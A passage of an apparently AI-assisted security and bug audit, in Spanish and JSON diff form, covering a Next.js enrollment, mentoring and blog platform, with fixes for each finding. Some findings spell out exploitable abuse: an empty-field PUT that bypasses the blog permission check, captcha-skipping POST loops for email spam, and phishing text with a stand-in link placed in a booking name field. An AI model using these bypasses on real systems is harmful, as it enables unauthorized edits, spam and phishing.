+     "escenario": "La inscripción está en estado 1 (Nueva). El admin A la cambia a 3 (Matriculado) y el admin B, con la tabla sin refrescar, a 2 (Rechazado) al mismo tiempo. Ambas peticiones leen currentEstado=1 y pasan validateInscripcionTransition. El UPDATE (línea 94) no condiciona el estado actual, así que gana el último y se produce de hecho 3→2, una transición prohibida. Además no se registra actualizado_por, aunque la columna existe.",
+     "correccion": "UPDATE ciepi.inscripciones SET estado_inscripcion=$1, actualizado_por=$3, fecha_ultima_actualizacion=NOW() WHERE id=$2 AND estado_inscripcion=$4 RETURNING ...; si no actualiza ninguna fila, responder 409 'El estado cambió, recargue'.",
+     "verificacion": "Confirmado. El SELECT del estado (líneas 45-48) y el UPDATE (líneas 94-99) van por separado, y el UPDATE no condiciona el estado actual (no hay AND estado_inscripcion = currentEstado), así que la TOCTOU existe. actualizado_por existe en el esquema (verificar_columnas.sql:126) y no se rellena. Requiere que dos administradores actúen a la vez: baja."
+    },
+    {
+     "titulo": "Al volver del callback biométrico sin modo=manual se consulta la cédula sin Turnstile, y el resultado biométrico no está ligado a la capacitación",
+     "severidad": "baja",
+     "archivo": "app/capacitaciones/inscribirse/[id]/page.tsx",
+     "linea": 133,
+     "escenario": "1) Con TURNSTILE_SECRET_KEY configurada, el usuario pulsa 'Volver a Opciones de Validación' en el callback. Al montarse la página se llama a cargarDatosEstudiante(savedCedula) con turnstileToken vacío, GET /api/verificar responde 403 y el usuario ve un error sin haber hecho nada. 2) El resultado biométrico guardado en sessionStorage no lleva capacitacionId ni caducidad. Si se valida para el curso A, se abandona y se abre el curso B en la misma pestaña, la línea 112 salta directo al formulario como 'biométrica' de B.",
+     "correccion": "Al volver, despachar a step 'metodo' o 'cedula' con la cédula precargada y pedir Turnstile antes de consultar. Guardar capacitacionId y timestamp junto al resultado, y descartarlo si no coincide con la capacitación actual o si tiene más de unos minutos.",
+     "verificacion": "Confirmado. 'Volver a Opciones' llama a redirectToEnrollment(false) sin modo=manual, y la página llama a cargarDatosEstudiante(savedCedula) (línea 133) con turnstileToken vacío, lo que da 403 si TURNSTILE_SECRET_KEY está configurada. El resultado biométrico en sessionStorage no se compara con CAPACITACION_ID al leerlo (líneas 111-116), y solo se limpia al enviar o elegir el modo manual."
+    }
+   ],
+   "descartados": []
+  },
+  {
+   "area": "Módulo de mentorías",
+   "confirmados": [
+    {
+     "titulo": "Bloqueos, desactivar mentor o cambiar su horario no tocan reservas existentes, y confirmar no revisa nada de nuevo",
+     "severidad": "media",
+     "archivo": "app/api/admin/mentorias/mentores/[id]/bloqueos/route.ts",
+     "linea": 396,
+     "escenario": "Un mentor tiene una reserva confirmada (o pendiente) para el 10/12. El admin registra vacaciones del 8 al 12/12, desactiva al profesor (activo=false / es_mentor=false) o borra ese bloque del horario. El INSERT del bloqueo (y el PUT de mentores/[id]) no busca reservas en ese rango. La reserva sigue 'confirmada', no se avisa a nadie, el cron manda el recordatorio de 24 h y la persona va a una sesión que no existe. Una reserva pendiente se puede confirmar después del bloqueo: gestion/route.ts:183 solo revisa estado y pendiente_expira, no el mentor ni los bloqueos.",
+     "correccion": "Al crear un bloqueo, desactivar un mentor o reemplazar su horario, consultar las reservas en estado confirmada o pendiente_verificacion de ese rango, devolverlas al admin (mejor: exigir que las cancele como cancelada_ciepi, que avisa por correo) o cancelarlas con aviso. Al confirmar, agregar al UPDATE un EXISTS que exija mentor activo/es_mentor y NOT EXISTS de un bloqueo en la fecha de Panamá de r.inicio.",
+     "verificacion": "Confirmado, aunque la línea citada no existe: el archivo tiene 40 líneas y el INSERT está en la 25. El POST de bloqueos (bloqueos/route.ts:25-31) y el PUT de mentores/[id]/route.ts (UPDATE es_mentor y DELETE/INSERT de mentor_disponibilidad, líneas 89-140) no revisan mentoria_reservas. La confirmación en gestion/route.ts:59-65 solo pide estado='pendiente_verificacion' AND pendiente_expira>NOW(); no mira si el mentor sigue activo/es_mentor ni los bloqueos. El cron (cron/mentorias-recordatorios/route.ts:35-40) manda el recordatorio a cualquier reserva 'confirmada'. Atenuante: el admin puede cancelar cada reserva a mano desde GestionReservaModal y avisar por correo. Pero nada le advierte que hay reservas afectadas. Corrección: al crear un bloqueo o desactivar al mentor, listar o devolver las reservas activas en ese rango (o rechazar el cambio), y en 'confirmar' exigir con EXISTS que el profesor esté activo y sin bloqueo."
+    },
+    {
+     "titulo": "El límite de 2 reservas activas por correo se puede saltar con solicitudes simultáneas",
+     "severidad": "baja",
+     "archivo": "app/api/mentorias/reservas/route.ts",
+     "linea": 62,
+     "escenario": "Con el aislamiento READ COMMITTED (el de withTransaction), dos o tres POST simultáneos con el mismo correo y turnos distintos (del mismo mentor o de otros) hacen COUNT a la vez: todos ven n=1 (menos de 2) y todos insertan. Resultado: el correo queda con 3 o más reservas activas. El índice único solo cubre (profesor_id, inicio), así que nada lo frena.",
+     "correccion": "Serializar por correo dentro de la transacción antes del COUNT, por ejemplo con `SELECT pg_advisory_xact_lock(hashtext('mentoria:' || $1))` usando el correo normalizado, o usar el aislamiento SERIALIZABLE con reintento.",
+     "verificacion": "Confirmado: en reservas/route.ts:62-72 el COUNT corre dentro de una transacción READ COMMITTED sin bloqueo (ni advisory lock ni FOR UPDATE), y el único índice que frena es el de (profesor_id, inicio). Con POST simultáneos para turnos distintos se pasa el tope. Bajo severidad: es un límite blando, cada solicitud necesita su propio token de Turnstile y un turno libre distinto, y el impacto es de unas pocas reservas de más. Corrección: pg_advisory_xact_lock(hashtext(lower(correo))) antes del COUNT."
+    },
+    {
+     "titulo": "La máquina de estados del admin no tiene en cuenta que una pendiente venció: deja cancelar una reserva que se muestra como 'Expirada' y pide un motivo que no se envía",
+     "severidad": "media",
+     "archivo": "lib/mentorias.ts",
+     "linea": 283,
+     "escenario": "Una reserva sigue en pendiente_verificacion con pendiente_expira ya pasado (el cron todavía no corrió). GET admin/reservas (route.ts:208-209) la muestra como 'expirada', pero calcula las transiciones con el estado crudo, que da ['cancelada_ciepi']. El modal ofrece 'Cancelar' en una fila 'Expirada'. El PATCH ([id]/route.ts:56) la acepta, exige un motivo que «se enviará a la persona», la pasa a cancelada_ciepi (el historial queda mal) y no manda correo, porque la línea 93 solo envía si estaba confirmada. Lo mismo pasa al cancelar cualquier pendiente vigente: el motivo nunca llega.",
+     "correccion": "Pasar pendiente_expira a transicionesAdminReserva y devolver [] si la pendiente ya venció (tratarla como expirada). En el PATCH, usar el estado efectivo y agregar `AND NOT (estado='pendiente_verificacion' AND pendiente_expira <= NOW())`. No exigir motivo, o no decir que se envía, cuando la reserva no estaba confirmada.",
+     "verificacion": "Confirmado. admin/reservas/route.ts:86-88 muestra 'expirada' pero llama a transicionesAdminReserva con el estado crudo r.estado. Para 'pendiente_verificacion' con inicio futuro devuelve ['cancelada_ciepi'] (lib/mentorias.ts:283-284), así que GestionReservaModal.tsx:240 ofrece 'Cancelar reserva' y la línea 253 dice 'Motivo (se enviará a la persona por correo)'. El PATCH ([id]/route.ts:56-86) acepta y exige el motivo, pero el correo solo sale si actual.estado==='confirmada' (línea 93). Con una pendiente vencida el estado final queda cancelada_ciepi en vez de expirada. Con una pendiente vigente el motivo nunca llega. Corrección: usar el estado visible para calcular las transiciones (una pendiente vencida no tiene transiciones), y al cancelar una pendiente enviar el correo o no pedir motivo."
+    },
+    {
+     "titulo": "La página del enlace del correo marca como 'vencida' la reserva ante cualquier error al confirmar",
+     "severidad": "baja",
+     "archivo": "app/mentorias/reserva/[token]/page.tsx",
+     "linea": 72,
+     "escenario": "La persona pulsa 'Confirmar reserva' a tiempo, pero el servidor responde 500 (fallo momentáneo de la BD) o 409 porque CIEPI la canceló. El cliente fuerza estado='expirada' sin mirar el código de respuesta: desaparece el botón de confirmar, se muestra 'La reserva venció' y 'Reservar otro horario', aunque la reserva sigue pendiente y se podía confirmar al reintentar. Termina expirando y la persona pierde el turno.",
+     "correccion": "Cambiar a 'expirada' solo con el código 410. Con otros errores, mostrar el mensaje y volver a pedir el estado real con GET /api/mentorias/reservas/gestion?token=..., para que el botón siga si la reserva aún está pendiente.",
+     "verificacion": "Confirmado en reserva/[token]/page.tsx:69-72: con cualquier success=false en 'confirmar' se fuerza estado 'expirada', sin mirar si fue 410, 409 o 500. El 410 es el caso correcto. El 409 (cancelada por CIEPI) muestra 'venció' en vez de 'cancelada', un texto engañoso pero con el mismo resultado práctico. El 500 transitorio oculta el botón aunque la reserva sigue pendiente. Si recarga la página, el GET devuelve el estado real y el botón vuelve, así que el daño se limita a un fallo poco frecuente y a la UX. Bajo a baja. Corrección: forzar 'expirada' solo con status 410 y, en otro caso, volver a pedir el GET."
+    },
+    {
+     "titulo": "El formulario de reserva cierra el turno ante cualquier error y deja guardado un token de Turnstile ya usado",
+     "severidad": "media",
+     "archivo": "app/mentorias/[id]/page.tsx",
+     "linea": 109,
+     "escenario": "La persona escribe un teléfono que el servidor rechaza (400) o falla Turnstile (403). En cualquier error el código recarga los turnos y hace setTurno(null): el formulario desaparece y hay que elegir el horario otra vez. Además, turnstileToken conserva el token, que Cloudflare ya consumió y no sirve de nuevo. Si envía antes de que el widget, que se monta de nuevo, emita otro token, el servidor responde 403 «Completa la verificación de seguridad» aunque la persona ya la hizo.",
+     "correccion": "Recargar turnos y limpiar el turno solo con 409 (horario ocupado). Después de cada intento, sea cual sea el resultado, hacer setTurnstileToken('') y window.turnstile.reset(widgetId) (exponer reset desde TurnstileWidget).",
+     "verificacion": "Confirmado en app/mentorias/[id]/page.tsx:106-111: ante cualquier error (400 de validación, 403 de Turnstile, 409) se llama cargar() y setTurno(null). El formulario y el TurnstileWidget están dentro de {turno && ...}, así que desaparecen y hay que elegir el turno otra vez. turnstileToken (línea 57) no se limpia: al volver a montar el widget, la validación del cliente (línea 88) deja enviar el token viejo ya consumido y el servidor responde 403. Pasa con un error común, como un teléfono mal escrito. Corrección: recargar y limpiar el turno solo con 409, y siempre poner setTurnstileToken('') y resetear el widget después de cada envío."
+    },
+    {
+     "titulo": "Los correos de verificación pueden servir para enviar spam o phishing desde el SMTP institucional, y Turnstile deja pasar todo si falta la clave",
+     "severidad": "media",
+     "archivo": "lib/mentoriaSolicitud.ts",
+     "linea": 42,
+     "escenario": "Cualquiera manda POST /api/mentorias/reservas con correo=víctima y nombre='Su cuenta INADEH fue suspendida, ingrese a http://malo.example ...' (texto libre de hasta 200 caracteres). El servidor envía desde la cuenta oficial de CIEPI 'Hola <nombre>, ...' a esa dirección. El límite es por correo destino, no por IP, así que con muchas direcciones no hay tope. Si TURNSTILE_SECRET_KEY no está en producción, verifyTurnstileToken (lib/turnstile.ts:14) devuelve success y no hay ninguna barrera: un bot puede además retener todos los turnos de todos los mentores renovándolos cada 15 minutos.",
+     "correccion": "Limitar nombre a letras, espacios y signos de nombre (rechazar '://', 'www.', dígitos largos y '@'). Hacer que Turnstile falle cerrado en producción (NODE_ENV=production sin clave → 503). Agregar un límite por IP, por ejemplo N solicitudes por hora.",
+     "verificacion": "Confirmado. validarSolicitudReserva (mentoriaSolicitud.ts:41-42) acepta en el nombre texto libre de 3 a 200 caracteres, incluidas URLs. El correo de verificación (mentoriasEmails.ts:91) lo inserta sin escapar en la parte de texto plano ('Hola ${r.nombre}'), y los clientes de correo convierten las URLs en enlaces. En el HTML se escapa, pero la URL sigue visible. El límite es por correo destino (2 activas). El tope real lo pone el número de turnos libres: cada solicitud retiene un turno 15 minutos, así que salen cientos de correos por cada ventana de 15 minutos. verifyTurnstileToken (turnstile.ts:13-16) devuelve success si falta TURNSTILE_SECRET_KEY; así está diseñado, pero en producción deja también acaparar todos los turnos. Corrección: restringir el nombre a letras, espacios y signos básicos (sin '/', ':' ni '.'), añadir límite por IP y, en producción, fallar cerrado si falta la clave de Turnstile."
+    },
+    {
+     "titulo": "El PATCH del admin guarda las notas y el enlace aunque después rechace el cambio de estado, y deja poner enlace a reservas canceladas o cerradas",
+     "severidad": "baja",
+     "archivo": "app/api/admin/mentorias/reservas/[id]/route.ts",
+     "linea": 27,
+     "escenario": "El admin manda un solo PATCH con enlace_reunion y estado. Mientras tanto la persona canceló, así que la transición falla con 409 «La reserva cambió...». El enlace y las notas ya se guardaron (UPDATE sin transacción), y la interfaz muestra error aunque hubo cambios parciales. También se puede guardar enlace_reunion en una reserva cancelada_usuario, expirada o completada, porque solo se revisa la modalidad.",
+     "correccion": "Validar primero la transición y todos los datos, y aplicar notas, enlace y estado en una sola transacción con el UPDATE condicionado al estado leído. Permitir el enlace solo en pendiente_verificacion o confirmada.",
+     "verificacion": "Confirmado en admin/reservas/[id]/route.ts:27-51: notas y enlace se guardan con UPDATE sueltos antes de validar la transición (54-92). Si después hay 409, quedan cambios a medias y se informa error. El enlace solo se valida por modalidad (línea 38), no por estado, así que se puede guardar en reservas canceladas o cerradas. El envío ya está protegido (línea 105 exige 'confirmada'). El impacto es menor. Corrección: hacer todo en withTransaction y validar primero la transición; el enlace solo para estados confirmada o pendiente."
+    },
+    {
+     "titulo": "El cron marca el recordatorio como enviado antes de mandarlo: si el proceso se corta, ese recordatorio no sale nunca",
+     "severidad": "baja",
+     "archivo": "app/api/cron/mentorias-recordatorios/route.ts",
+     "linea": 315,
+     "escenario": "El UPDATE pone recordatorio_enviado_en=NOW() en todas las reservas de la ventana y después envía los correos uno por uno (dos SMTP por reserva). Si el proceso de Node se reinicia o cae en medio del bucle (despliegue, reciclaje de IIS/PM2), las filas que faltaban quedan marcadas sin haber recibido nada y el WHERE recordatorio_enviado_en IS NULL no las vuelve a tomar.",
+     "correccion": "Usar una marca temporal: reclamar con recordatorio_reclamado_en y volver a tomar las filas cuyo reclamo tenga más de 30 minutos sin recordatorio_enviado_en. O procesar en lotes cortos y fijar recordatorio_enviado_en solo después de que sendEmail termine bien.",
+     "verificacion": "Confirmado, aunque la línea real es la 35-40 y no la 315 (el archivo tiene 62 líneas). El UPDATE marca todas las filas antes del bucle de envío. Solo se revierte cuando enviarRecordatorio lanza un error (línea 53), no si el proceso se cae a mitad del bucle. Corrección: tomar las filas de a una con un estado intermedio y una marca de tiempo (p. ej. recordatorio_reclamado_en y volver a tomar las que lleven más de 30 minutos), o marcar cada fila después de enviarla con un UPDATE condicional."
+    },
+    {
+     "titulo": "Nada impide reservar la misma aula a la misma hora con dos mentores",
+     "severidad": "baja",
+     "archivo": "app/api/admin/mentorias/mentores/[id]/route.ts",
+     "linea": 322,
+     "escenario": "Se configuran el mentor A y el mentor B con bloques presenciales el lunes de 9:00 a 12:00 en la misma aula. Cada uno genera sus turnos por separado (cargarTurnosMentor solo mira las reservas de ese profesor) y el índice único es (profesor_id, inicio). Dos personas reservan el lunes a las 9:00 con A y con B, y las dos reservas quedan confirmadas en la misma aula.",
+     "correccion": "Al guardar el horario, avisar si el aula ya está en otro bloque de otro mentor que se cruce en día y hora. Al reservar, excluir turnos presenciales cuya aula tenga otra reserva activa que se solape (o agregar una restricción EXCLUDE con tstzrange sobre aula_id).",
+     "verificacion": "Confirmado, aunque la línea 322 no existe: el archivo tiene 154 líneas y la validación de aulas está en la 103-114. El PUT solo comprueba que el aula pertenezca a la sede. validarDisponibilidad solo detecta solapes dentro del mismo mentor, y cargarTurnosMentor (mentoriasServer.ts:42-46) solo mira las reservas de ese profesor. Que dos mentores compartan aula puede ser intencional (por ejemplo un espacio abierto), así que es un riesgo de configuración más que un bug. Corrección: al guardar el horario, avisar si se cruza con bloques de otro mentor en la misma aula."
+    },
+    {
+     "titulo": "El endpoint público de mentores hace 5 consultas por mentor en cada visita, sin caché",
+     "severidad": "baja",
+     "archivo": "app/api/mentorias/mentores/route.ts",
+     "linea": 244,
+     "escenario": "GET /api/mentorias/mentores (force-dynamic, sin autenticación ni límite) llama a cargarTurnosMentor para cada mentor: 1 consulta del profesor más 4 en paralelo, y genera 28 días de turnos. Con 20 mentores son unas 100 consultas por visita. Recargas repetidas o un bot pueden agotar el pool de conexiones de PostgreSQL y bloquear también el admin.",
+     "correccion": "Calcular el próximo turno con consultas agrupadas para todos los mentores (WHERE profesor_id = ANY($1)) o guardar la respuesta en caché unos 30-60 segundos (unstable_cache / revalidate). Agregar un límite por IP.",
+     "verificacion": "Confirmado, aunque la línea 244 no existe: el archivo tiene 26 líneas y el código está en la 11-20. Hace 1 consulta para la lista más, por cada mentor, 1 consulta y 4 en paralelo, todo con Promise.all, sin caché y con force-dynamic. Que 'agote el pool' está exagerado: pg encola las peticiones sobre el máximo del pool, así que el efecto es más latencia para todos, admin incluido, bajo carga o abuso. Corrección: una sola consulta por lote (WHERE profesor_id = ANY($1)) y caché corta (30-60 s) del resultado."
+    }
+   ],
+   "descartados": []
+  },
+  {
+   "area": "Blog, consultas, newsletter y eventos",
+   "confirmados": [
+    {
+     "titulo": "PUT de blog: el control de permisos de edición se salta con valores falsy y el contenido no se valida, lo que permite romper el blog público",
+     "severidad": "alta",
+     "archivo": "app/api/admin/blog/[id]/route.ts",
+     "linea": 152,
+     "escenario": "La comprobación de permisos solo se ejecuta si `titulo || contenido || imagen_banner || palabras_clave` es truthy, pero el UPDATE se arma con `!== undefined` (líneas 204-226). Un usuario de Relaciones Públicas (rol 4, canEditBlog=false) o cualquier admin que no sea el creador envía PUT /api/admin/blog/7 con {\"titulo\":\"\",\"contenido\":\"\",\"imagen_banner\":null}. El check no se ejecuta, se guarda titulo='' y contenido='\"\"' (escalar JSONB) aunque el blog esté publicado. Además, el PUT no exige que `contenido` sea un array (el POST sí lo exige en la línea 197), así que el propio creador puede guardar {\"contenido\":\"texto\"}. En ambos casos, `jsonb_array_elements(b.contenido)` de app/api/blog/route.ts:54 y lib/blogPublic.ts:74 falla con «cannot extract elements from a scalar»: /api/blog responde 500 para todos los visitantes y la portada se queda sin noticias sin dar ningún aviso.",
+     "correccion": "Ejecutar la comprobación de permisos cuando cualquiera de esos campos sea `!== undefined`. Validar en el PUT con las mismas reglas que el POST: titulo no vacío y `Array.isArray(contenido)`, con 400 si no se cumplen. Como defensa extra, añadir `WHERE jsonb_typeof(b.contenido)='array'` en las consultas de preview.",
+     "verificacion": "Confirmado. app/api/admin/blog/[id]/route.ts:151 condiciona el check de permisos a `titulo || contenido || imagen_banner || palabras_clave` (truthy), mientras que el UPDATE (líneas ~204-226) usa `!== undefined`. Rol 4 (canEditBlog=false) o un admin no creador puede enviar {titulo:'',contenido:''} y saltarse el 403. JSON.stringify('') guarda el escalar JSONB '\"\"', y no se valida que contenido sea array. jsonb_array_elements(b.contenido) en app/api/blog/route.ts:54 y lib/blogPublic.ts:74 se evalúa por fila con estado=6, así que un blog publicado con escalar provoca 500 en el listado público. Corrección: comprobar permisos con `!== undefined` en cualquier campo de contenido y exigir Array.isArray(contenido) y titulo no vacío."
+    },
+    {
+     "titulo": "El creador puede editar el contenido de un blog Publicado o En revisión de RR.PP. sin pasar de nuevo por la aprobación",
+     "severidad": "alta",
+     "archivo": "app/api/admin/blog/[id]/route.ts",
+     "linea": 153,
+     "escenario": "La regla de edición solo mira el rol y si el usuario es el creador; nunca mira `currentBlog.estado`. Un autor CIEPI (rol 3) consigue publicar su blog (estado 6), entra en /admin/blog/editar/ID (el botón Editar sale para cualquier creador, app/admin/blog/page.tsx:168) y reemplaza el texto. El cambio sale publicado al momento, sin revisión de CIEPI ni de RR.PP. Lo mismo ocurre en el estado 4: el revisor aprueba un texto distinto del que el autor envió.",
+     "correccion": "Permitir editar el contenido solo en los estados 1, 3 y 5 (Borrador o Rechazado). Si se edita un blog en estado 6 (solo admin), devolverlo a Borrador o registrar la edición en historial_estados. Ocultar el botón Editar según el estado con la misma regla compartida de lib/permissions.ts.",
+     "verificacion": "Confirmado. El PUT solo mira el rol y isCreator (línea 152), nunca currentBlog.estado. Ni la página editar/[id] ni BlogEditor bloquean por estado, y app/admin/blog/page.tsx:168 muestra Editar a cualquier creador. Un autor puede cambiar el texto de un blog en estado 6 (sale publicado sin revisión) o en 2/4 (el revisor aprueba otro texto). Corrección: permitir editar contenido solo en estados 1/3/5 (o devolverlo a 1/2 al editar), salvo override explícito de admin."
+    },
+    {
+     "titulo": "La búsqueda pública del blog siempre da 500: usa unnest() sobre una columna JSONB",
+     "severidad": "alta",
+     "archivo": "app/api/blog/route.ts",
+     "linea": 26,
+     "escenario": "palabras_clave es JSONB (database/create_blogs_table.sql:7 y verificar_columnas.sql:21). Un visitante escribe «innovación» en el buscador de /blog, la página llama a /api/blog?search=innovación y Postgres devuelve «function unnest(jsonb) does not exist». La API responde 500 y la búsqueda nunca devuelve resultados.",
+     "correccion": "Usar `SELECT 1 FROM jsonb_array_elements_text(COALESCE(b.palabras_clave,'[]'::jsonb)) AS palabra WHERE palabra ILIKE $n`.",
+     "verificacion": "Confirmado. palabras_clave es JSONB (database/create_blogs_table.sql:7, verificar_columnas.sql:21), y app/api/blog/route.ts:26 usa unnest(b.palabras_clave), que no existe para jsonb. Postgres falla al planificar la consulta en cuanto search no está vacío, y app/blog/page.tsx:51 envía search desde el buscador. Corrección: usar jsonb_array_elements_text(b.palabras_clave)."
+    },
+    {
+     "titulo": "Al responder una consulta, se queda en 'pendiente' (o en el estado que tuviera)",
+     "severidad": "media",
+     "archivo": "app/admin/consultas/page.tsx",
+     "linea": 90,
+     "escenario": "El modal inicializa nuevoEstado con el estado actual (línea 65) y siempre envía {respuesta, estado: nuevoEstado}. Como en el servidor `estado !== undefined`, nunca entra en el paso automático a 'respondida' (app/api/admin/consultas/[id]/route.ts:136). Un administrador responde una consulta 'pendiente' sin tocar el selector: se muestra «Respuesta enviada exitosamente», pero la consulta sigue como 'pendiente' en el listado y en los contadores. Responder de nuevo además sobrescribe respondido_por y fecha_respuesta sin dejar rastro.",
+     "correccion": "En el servidor, si llega una respuesta no vacía y el estado es 'pendiente' o 'en_proceso', forzar 'respondida'. En el cliente, enviar `estado` solo si el usuario lo cambió. Definir transiciones válidas (pendiente→en_proceso→respondida→cerrada) y rechazar con 400 las demás, incluido estado=''.",
+     "verificacion": "Confirmado. handleVerDetalles fija nuevoEstado=consulta.estado (page.tsx:65) y handleResponder envía siempre estado (línea 90), así que el servidor nunca entra en el `if (estado === undefined)` que pone 'respondida' (route.ts:136). La consulta queda 'pendiente' tras responder. Se baja a media porque el admin puede elegir 'respondida' a mano y no se pierden datos. Corrección: en el cliente, si hay respuesta nueva y el estado no cambió, enviar 'respondida' o no enviar estado."
+    },
+    {
+     "titulo": "Enviar el newsletter, listar suscriptores y borrar consultas o eventos solo exige isAdmin, sin mirar el rol",
+     "severidad": "media",
+     "archivo": "app/api/admin/newsletter/enviar/route.ts",
+     "linea": 17,
+     "escenario": "isAdmin vale true para cualquier fila de usuarios_administradores (lib/authOptions.ts:96), incluidos los roles 3 (CIEPI/Editor) y 4 (Relaciones Públicas). Un editor llama a POST /api/admin/newsletter/enviar y manda un correo masivo a todos los suscriptores activos desde el SMTP institucional. También puede obtener todos los correos con GET /api/admin/newsletter (route.ts:10), borrar consultas (consultas/[id] DELETE:197) y borrar eventos (eventos/[id] DELETE:205). Esto va más allá del pendiente ya conocido de que el menú no filtra por rol: el problema está en la API. Además, el envío no tiene idempotencia ni bloqueo: un doble clic o un reintento tras un timeout del proxy reenvía el boletín a todos, y el registro en newsletter_envios solo se inserta al terminar.",
+     "correccion": "Añadir un `requireRole([Role.ADMIN, Role.SUPER_ADMIN])` en estas rutas. Para el envío, insertar primero newsletter_envios con estado 'enviando' y un bloqueo (por ejemplo pg_advisory_xact_lock o un índice único sobre el envío en curso), rechazar con 409 si ya hay uno en marcha y actualizar los totales al final.",
+     "verificacion": "Confirmado que las rutas newsletter/enviar:17, newsletter GET:10, consultas/[id] DELETE y eventos/[id] DELETE solo exigen session.user.isAdmin, que vale true para cualquier fila de usuarios_administradores (authOptions.ts:96), incluidos los roles 3 y 4. Es un ángulo nuevo frente al pendiente 'el menú no filtra por rol' (aquí falla la API). El doble envío solapa en parte con el pendiente conocido 'se envía sin confirmación'. Se baja a media porque los usuarios son personal interno autenticado por Azure AD. Corrección: comprobar rolId ∈ {1,2} en estas rutas y añadir un bloqueo de envío (fila 'en_curso' en newsletter_envios antes de empezar)."
+    },
+    {
+     "titulo": "El reCAPTCHA se puede omitir en contacto y newsletter: spam y envío masivo de correos de confirmación a terceros",
+     "severidad": "alta",
+     "archivo": "app/api/newsletter/suscribir/route.ts",
+     "linea": 64,
+     "escenario": "Las dos rutas solo verifican el captcha `if (recaptchaToken)`, y en el newsletter verifyRecaptcha devuelve true si falta RECAPTCHA_SECRET_KEY (línea 18). Un script envía POST /api/newsletter/suscribir con {\"email\":\"victima@x.com\",\"aceptoPolitica\":true} en bucle. Mientras la víctima siga en 'pendiente', cada petición regenera el token y manda otro correo de confirmación desde el SMTP de INADEH, sin límite de frecuencia, lo que daña la reputación del dominio. Lo mismo ocurre en app/api/contacto/consulta/route.ts:88: sin token se insertan consultas sin límite y sin restricción de longitud en comentarios. Además, la respuesta `alreadySubscribed` permite averiguar qué correos están suscritos.",
+     "correccion": "En producción, exigir el token: si falta o si falta la clave secreta, responder 400/503. Verificar también `action`. Añadir rate-limit por IP y por correo (por ejemplo, no reenviar la confirmación si confirm_token_expiracion se generó hace menos de 10 minutos). Devolver el mismo mensaje genérico tanto si el correo ya está suscrito como si no.",
+     "verificacion": "Confirmado. suscribir/route.ts:64 solo verifica `if (recaptchaToken)`, y verifyRecaptcha devuelve true sin RECAPTCHA_SECRET_KEY (línea 18). Con estado 'pendiente' o 'baja', cada POST regenera el token y llama a sendEmail, sin límite de frecuencia (no hay rate limit en el código). contacto/consulta/route.ts:88 tiene el mismo `if (recaptchaToken)`. alreadySubscribed permite enumerar correos. Corrección: exigir el token (400 si falta), fallar cerrado sin secret en producción y limitar el reenvío por email/IP (por ejemplo, no reenviar si el token anterior tiene menos de N minutos)."
+    },
+    {
+     "titulo": "Las transiciones de estado del blog no son atómicas: hay condición de carrera y el comentario temporal puede asociarse a otra transición",
+     "severidad": "media",
+     "archivo": "app/api/admin/blog/[id]/route.ts",
+     "linea": 192,
+     "escenario": "El estado se lee en la línea 137, la transición se valida en memoria, se llama a set_comentario_estado (línea 193) y se ejecuta un UPDATE sin `AND estado = $actual` (línea 251), todo con conexiones distintas del pool y sin transacción. Caso 1: un revisor de CIEPI y un admin abren el mismo blog en estado 2; uno lo rechaza (2→3) y el otro lo envía a RR.PP. (2→4). Ambos validan contra 2 y gana el último, así que un blog rechazado puede acabar en revisión de RR.PP. Caso 2: si el UPDATE falla después de guardar el comentario, este queda en temp_blog_comentarios y el trigger lo asigna a la siguiente transición de ese blog, hecha por otra persona.",
+     "correccion": "Usar withTransaction: `SELECT estado, creado_por ... FOR UPDATE`, set_comentario_estado y UPDATE en la misma transacción. Como alternativa, hacer el UPDATE con `WHERE id=$x AND estado=$estadoLeido` y devolver 409 si rowCount es 0.",
+     "verificacion": "Confirmado. El estado se lee en la línea 137, set_comentario_estado se llama aparte (línea 193) y el UPDATE (línea ~251) no lleva `AND estado = $actual` ni va en una transacción. query() usa el pool, así que son conexiones distintas. temp_blog_comentarios se indexa solo por blog_id (database/create_blogs_table.sql:41-45), y el trigger toma ese comentario en la siguiente transición si el UPDATE no llega a ejecutarse. Es una carrera real con baja probabilidad. Corrección: un único cliente con BEGIN/COMMIT y `WHERE id=$n AND estado=$actual` (409 si rowCount=0)."
+    },
+    {
+     "titulo": "El rol CIEPI puede aprobar su propio blog y mover de estado blogs ajenos (no se separan las funciones)",
+     "severidad": "media",
+     "archivo": "lib/permissions.ts",
+     "linea": 64,
+     "escenario": "El comentario dice «Solo puede cambiar si es su blog (verificado en otra parte)», pero el PUT no comprueba la autoría al cambiar de estado. Un autor CIEPI crea su blog, lo envía a revisión (1→2) y él mismo lo aprueba (2→4), saltándose la revisión de CIEPI. También puede rechazar (2→3) o reenviar los blogs de otros autores.",
+     "correccion": "En validateBlogStateTransition, recibir `isCreator`. El creador solo puede ejecutar 1→2, 3→1 y 5→1. Las transiciones de revisión (2→3 y 2→4) las hace un revisor CIEPI que no sea el autor, o un admin. Corregir o eliminar el comentario engañoso.",
+     "verificacion": "Confirmado. lib/permissions.ts:64 dice «Solo puede cambiar si es su blog (verificado en otra parte)», pero el PUT de app/api/admin/blog/[id]/route.ts no comprueba isCreator ni autoría al cambiar de estado. Un rol 3 puede pasar su propio blog de 2 a 4 (autoaprobación CIEPI) o rechazar o mover blogs ajenos. El impacto queda limitado porque para publicar (4→6) sigue haciendo falta rol 4 o admin. Corrección: definir la regla de separación (el revisor no puede ser el autor en 2→3 y 2→4; el autor solo hace 1→2) y aplicarla en el servidor."
+    },
+    {
+     "titulo": "El modal de cambio de estado ofrece estados según el rol y no según el grafo de transiciones",
+     "severidad": "baja",
+     "archivo": "components/BlogEditor.tsx",
+     "linea": 648,
+     "escenario": "La lista se filtra con getAllowedStatesForRole(userRole), que ignora el estado actual. Un rol 3 con un blog en Borrador ve 'Rechazado por CIEPI' y 'En revisión RR.PP.'; al elegirlos recibe 400 «Transición no permitida». Un admin ve los 6 estados desde cualquier estado y puede despublicar (6→1) o publicar desde Borrador (1→6) sin aviso de que es un salto de etapa; el servidor lo acepta como override y solo deja un console.warn, sin registrar quién lo hizo en el historial.",
+     "correccion": "Filtrar con `validateBlogStateTransition(localBlog.estado, id, userRole).allowed` y mostrar una etiqueta «salto de etapa» cuando isOverride sea true. Exigir comentario obligatorio en los overrides y guardar el autor en historial_estados (hoy cambiado_por es aprobado_por, que también se rellena cuando el autor solo envía a revisión).",
